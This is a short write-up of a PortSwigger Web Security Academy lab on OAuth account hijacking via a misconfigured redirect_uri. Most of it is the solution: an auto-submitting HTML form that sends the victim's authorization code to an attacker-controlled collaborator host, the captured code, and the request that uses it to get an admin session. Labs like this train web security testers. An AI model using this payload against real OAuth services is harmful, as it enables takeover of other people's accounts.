# [Lab: OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

## Lab

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Analysis

both grant type (authorization code and implicit) either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri`.

=> craft a csrf-like attack form with fake `redirect_uri`

Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

## Solutions

csrf-like:

  ```html
  <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
      <form action="https://oauth-0a130095032b5f8cc29c558302ee006e.web-security-academy.net/auth">
        <input type="hidden" name="client&#95;id" value="iso19mhkj5ummfi37cqbe" />
        <!-- collaborator client address -->
        <input type="hidden" name="redirect&#95;uri" value="https&#58;&#47;&#47;5366s4akp4v4kffd1yhoq9ocb3hu5otd.oastify.com" />
        <input type="hidden" name="response&#95;type" value="code" />
        <input type="hidden" name="scope" value="openid&#32;profile&#32;email" />
        <input type="submit" value="Submit request" />
      </form>
      <script>
          document.forms[0].submit();
      </script>
    </body>
  </html>
  ```

deliver to victim then check the collaborator client:

  ```http
  GET /?code=DJYAcffr4h674oFVmIrOLakqQmJa7DoPEnMnQZYhSJa HTTP/1.1
  Host: 5366s4akp4v4kffd1yhoq9ocb3hu5otd.oastify.com
  ```

api call:

  ```http
  GET /oauth-callback?code=DJYAcffr4h674oFVmIrOLakqQmJa7DoPEnMnQZYhSJa HTTP/1.1
  Host: 0acc001e03a15fb0c20957c9005200f4.web-security-academy.net

  HTTP/1.1 200 OK
  Set-Cookie: session=sUSmrGb2GvyMkucGstigk7ZR5iYDQduW; 

  <a href="/admin">Admin panel</a>
  ```

solved
